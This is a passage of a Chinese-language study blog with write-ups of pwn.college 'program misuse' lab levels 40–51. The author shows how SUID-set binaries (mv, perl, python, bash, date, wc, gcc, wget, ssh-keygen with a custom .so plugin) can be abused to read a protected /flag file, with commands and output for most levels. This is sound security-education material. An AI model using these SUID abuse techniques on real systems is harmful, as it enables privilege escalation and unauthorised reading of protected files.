+</code></pre> <h2 id=level40-lets-you-get-the-flag-by-doing-tricks-with-permissions>level40 Lets you get the flag by doing tricks with permissions!</h2> <pre><code>hacker@program-misuse-level-40:~$ sh file.sh
+Welcome to ./babysuid_level40!
+
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/mv.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
+</code></pre> <p>这题，十分的离谱啊，完全不会做，看的答案，实在是太骚气了，使用mv把cat覆盖mv</p> <pre><code>hacker@program-misuse-level-40:~$ mv /usr/bin/cat /usr/bin/mv
+hacker@program-misuse-level-40:~$ sh file.sh
+Welcome to ./babysuid_level40!
+
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/mv.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level40) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/mv!
+hacker@program-misuse-level-40:~$ mv /flag
+pwn.college{g9AYY8a5E2v4R8jr_434HNFYEL3.0lM4EDL2QjMyMzW}
+hacker@program-misuse-level-40:~$
+</code></pre> <p>///@TODO:这个值得记录一下！</p> <p>这个题让我想起了一个看到的内容：</p> <blockquote> <p>如果我们在命令之中不使用管道而使用重定向（这是新手可能会犯的错误）那么前一个输出会重写到后面的命令之中造成混乱，比如 cat /flag &gt; more</p> </blockquote> <h2 id=level41-lets-you-read-the-flag-because-they-let-you-program-anything>level41 Lets you read the flag because they let you program anything!</h2> <pre><code>hacker@program-misuse-level-41:~$ sh file.sh
+Welcome to ./babysuid_level41!
+
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/perl.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level41) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/perl!
+</code></pre> <p><code>perl</code>是个脚本解释器，</p> <pre><code>hacker@program-misuse-level-41:~$ perl -ne &quot;print if pwn.college&quot; /flag
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+        LANGUAGE = (unset),
+        LC_ALL = (unset),
+        LC_CTYPE = &quot;C.UTF-8&quot;,
+        LANG = &quot;en_US.UTF-8&quot;
+    are supported and installed on your system.
+perl: warning: Falling back to the standard locale (&quot;C&quot;).
+pwn.college{s8g_u7MkHNRfph-Yrrslj2vzKUJ.01M4EDL2QjMyMzW}
+hacker@program-misuse-level-41:~$
+</code></pre> <p>打印有pen.college的行</p> <h2 id=level42-lets-you-read-the-flag-because-they-let-you-program-anything>level42 Lets you read the flag because they let you program anything!</h2> <pre><code>hacker@program-misuse-level-42:~$ sh file.sh
+Welcome to ./babysuid_level42!
+
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/python.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level42) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/python!
+</code></pre> <p>使用python</p> <pre><code>&gt;&gt;&gt; with open(&quot;/flag&quot;,&quot;r&quot;) as f:
+...     print(f.read())
+...
+pwn.college{kTtv9lYtW7yK8dnUSvApk5Yv1s-.0FN4EDL2QjMyMzW}
+
+&gt;&gt;&gt;
+</code></pre> <h2 id=level43-lets-you-read-the-flag-because-they-let-you-program-anything>level43 Lets you read the flag because they let you program anything!</h2> <pre><code>hacker@program-misuse-level-43:~$ sh file.sh
+Welcome to ./babysuid_level43!
+
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/ruby.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level43) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ruby!
+</code></pre> <p>用ruby写脚本</p> <pre><code># 打开文件
+File.open('/flag', 'r') do |f|
+  # 读取文件内容
+  content = f.read
+  # 输出文件内容
+  puts content
+end
+</code></pre> <pre><code>hacker@program-misuse-level-43:~$ ruby level43.rb
+pwn.college{smGb0PfTvxp0__6HgKHsucNW2Pg.0VN4EDL2QjMyMzW}
+hacker@program-misuse-level-43:~$
+</code></pre> <h2 id=level44-lets-you-read-the-flag-because-they-let-you-program-anything>level44 Lets you read the flag because they let you program anything!</h2> <pre><code>hacker@program-misuse-level-44:~$ sh file.sh
+Welcome to ./babysuid_level44!
+
+This challenge is part of a series of programs that
+let you read the flag because they let you program anything.
+
+I just set the SUID bit on /usr/bin/bash.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level44) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/bash!
+</code></pre> <p>bash，参照之前的题拿到提示符</p> <pre><code>hacker@program-misuse-level-44:~$ bash -p
+bash-5.0# cat /flag
+pwn.college{wsQ6idwZWBnJ7doJInQhvY0hBVg.0lN4EDL2QjMyMzW}
+bash-5.0#
+</code></pre> <h2 id=level45-just-straight-up-wasnt-designed-to-let-you-read-files>level45 Just straight up wasn't designed to let you read files!</h2> <pre><code>hacker@program-misuse-level-45:~$ sh file.sh
+Welcome to ./babysuid_level45!
+
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/date.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level45) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/date!
+</code></pre> <p>手册里写了-f读文件</p> <pre><code>hacker@program-misuse-level-45:~$ date -f /flag
+date: invalid date 'pwn.college{E0wTS_9vWAv5Z6QWVWGpaHKER5P.01N4EDL2QjMyMzW}'
+hacker@program-misuse-level-45:~$
+</code></pre> <h2 id=level46-just-straight-up-wasnt-designed-to-let-you-read-files>level46 Just straight up wasn't designed to let you read files!</h2> <pre><code>hacker@program-misuse-level-46:~$ sh file.sh
+Welcome to ./babysuid_level46!
+
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/dmesg.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level46) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/dmesg!
+</code></pre> <p>显示开机时间之类的东西</p> <pre><code>hacker@program-misuse-level-46:~$ dmesg -F /flag
+[    0.000000] pwn.college{Q8U4rT5_srr0BlLq1ZlDOJx0yDe.0FO4EDL2QjMyMzW}
+hacker@program-misuse-level-46:~$
+</code></pre> <p>都是看手册</p> <h2 id=level47-just-straight-up-wasnt-designed-to-let-you-read-files>level47 Just straight up wasn't designed to let you read files!</h2> <pre><code>hacker@program-misuse-level-47:~$ sh file.sh
+Welcome to ./babysuid_level47!
+
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/wc.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level47) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/wc!
+</code></pre> <p><code>wc</code>一般用于统计行号、字数什么的。</p> <pre><code>hacker@program-misuse-level-47:~$ wc --files0-from=/flag
+wc: 'pwn.college{shy1dFSZ2LmpPnQ-OAl_RoDeLxh.0VO4EDL2QjMyMzW}'$'\n': No such file or directory
+hacker@program-misuse-level-47:~$
+</code></pre> <p>从手册来看就上面这个不是统计数量的，因此就它了！</p> <h2 id=level48-just-straight-up-wasnt-designed-to-let-you-read-files>level48 Just straight up wasn't designed to let you read files!</h2> <pre><code>hacker@program-misuse-level-48:~$ sh file.sh
+Welcome to ./babysuid_level48!
+
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/gcc.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level48) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/gcc!
+</code></pre> <p>有点儿意思，gcc都出来了</p> <pre><code>hacker@program-misuse-level-48:~$ gcc -x c -E /flag
+# 1 &quot;/flag&quot;
+# 1 &quot;&lt;built-in&gt;&quot;
+# 1 &quot;&lt;command-line&gt;&quot;
+# 31 &quot;&lt;command-line&gt;&quot;
+# 1 &quot;/usr/include/stdc-predef.h&quot; 1 3 4
+# 32 &quot;&lt;command-line&gt;&quot; 2
+# 1 &quot;/flag&quot;
+pwn.college{UgtHTJRU8raItcJF89PS-hM7Rh9.0FM5EDL2QjMyMzW}
+hacker@program-misuse-level-48:~$
+</code></pre> <p>它这个必须要指定语言，不然不能运行</p> <p>///@TODO: 这个一定要去看官方解答，直接在一个程序里面include '/flag'，然后靠报错得到flag，非常有启发</p> <h2 id=level49-just-straight-up-wasnt-designed-to-let-you-read-files>level49 Just straight up wasn't designed to let you read files!</h2> <pre><code>hacker@program-misuse-level-49:~$ sh file.sh
+Welcome to ./babysuid_level49!
+
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/as.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level49) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/as!
+</code></pre> <p><code>as</code>:汇编语言的编译器</p> <pre><code>hacker@program-misuse-level-49:~$ as -g /flag
+/flag: Assembler messages:
+/flag:1: Error: no such instruction: `pwn.college{MqHCh7Oprd3rEP2f1i_RgAl8QZR.0VM5EDL2QjMyMzW}'
+hacker@program-misuse-level-49:~$
+</code></pre> <p>通过调试输出</p> <h2 id=level50-just-straight-up-wasnt-designed-to-let-you-read-files>level50 Just straight up wasn't designed to let you read files!</h2> <pre><code>hacker@program-misuse-level-50:~$ sh file.sh
+Welcome to ./babysuid_level50!
+
+This challenge is part of a series of programs that
+just straight up weren't designed to let you read files.
+
+I just set the SUID bit on /usr/bin/wget.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level50) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/wget!
+</code></pre> <p><code>wget</code>:下载器</p> <pre><code>hacker@program-misuse-level-50:~$ nc -lp 8888 &amp; wget --post-file=/flag http://127.0.0.1:8888
+[1] 5873
+--2023-07-22 13:39:17--  http://127.0.0.1:8888/
+Connecting to 127.0.0.1:8888... connected.
+POST / HTTP/1.1
+User-Agent: Wget/1.20.3 (linux-gnu)
+Accept: */*
+Accept-Encoding: identity
+Host: 127.0.0.1:8888
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+
+HTTP request sent, awaiting response... pwn.college{M8oJZxXsT1hCl5_WCWqpA-ITlJZ.0lM5EDL2QjMyMzW}
+
+</code></pre> <p>有个叫文件上传的功能，这个看了一个别人的答案</p> <h2 id=level51-shows-how-dangerous-it-is-to-allow-users-to-load-their-own-code-as-plugins-into-the-program-but-figuring-out-how-is-the-hard-part>level51 Shows how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part)!</h2> <pre><code>hacker@program-misuse-level-51:~$ sh file.sh
+Welcome to ./babysuid_level51!
+
+This challenge is part of a series of programs that
+show you how dangerous it is to allow users to load their own code as plugins into the program (but figuring out how is the hard part!).
+
+I just set the SUID bit on /usr/bin/ssh-keygen.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level51) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ssh-keygen!
+</code></pre> <p>这个我是一点儿都不会，看了一下讲解才明白，G</p> <p>这个就是写一个C/C++程序，里面要有C_GetFunctionList这个函数，然后用sendfile来open文件。</p> <p>然后使用gcc编译成.so文件，最后使用ssh-keygen -D即可。</p> <pre><code>hacker@program-misuse-level-51:~$ ssh-keygen -D ./level51.so
+pwn.college{koI1pFWalnNHyjlN_NQ4CLcsasT.01M5EDL2QjMyMzW}
+C_GetFunctionList for provider ./level51.so failed: 57
+cannot read public key from pkcs11
+hacker@program-misuse-level-51:~$
+</code></pre> <h2 id=_2>值得记录的内容</h2> <p>关于mv 那块儿的，[一个博客]（https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619）</p> <p>最后一个题的<a href="https://www.youtube.com/watch?v=14mIjpOXnrM&t=2878s">讲解</a>,这玩意儿不讲是真不会，太菜了</p> <hr> <div class=md-source-date> <small> 最后更新: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">July 26, 2023</span> </small> </div> <script src=https://giscus.app/client.js data-repo=PKUFlyingPig/cs-self-learning data-repo-id=R_kgDOGP67ng data-category=Announcements data-category-id=DIC_kwDOGP67ns4COM9Q data-mapping=title data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async>
+</script> <script>
+    var palette = __get("__palette")
+    if (palette && typeof palette.color === "object") {
+        if (palette.color.scheme === "slate") {
+            const giscus = document.querySelector("script[src*=giscus]")
+            giscus.setAttribute("data-theme", "dark_protanopia")
+        }
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+        const ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function () {
+            var palette = __get("__palette")
+            if (palette && typeof palette.color === "object") {
+                const theme = palette.color.scheme === "slate" ? "dark_protanopia" : "light_protanopia"
+                const frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage({
+                    giscus: { setConfig: { theme } }
+                }, "https://giscus.app")
+            }
+        })
+    })
+</script> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top data-md-state=hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../ class="md-footer__link md-footer__link--prev" aria-label="上一页: ABOUT CSE466" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> ABOUT CSE466 </div> </div> </a> <a href=../program-interaction/ class="md-footer__link md-footer__link--next" aria-label="下一页: program interaction" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> program interaction </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2023-present <a href=https://github.com/TephrocactusMYC target=_blank rel="noopener noreferrer">TephrocactusMYC</a> </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> <div class=md-footer-social> <a href=https://tephrocactusmyc.github.io/CTF-CLASS/ target=_blank rel=noopener title=tephrocactusmyc.github.io class=md-footer-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../..", "features": ["header.autohide", "navigation.tracking", "navigation.top", "search.highlight", "search.share", "search.suggest", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.fcfe8b6d.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "version": null}</script> <script src=../../assets/javascripts/bundle.b1047164.min.js></script> </body> </html>
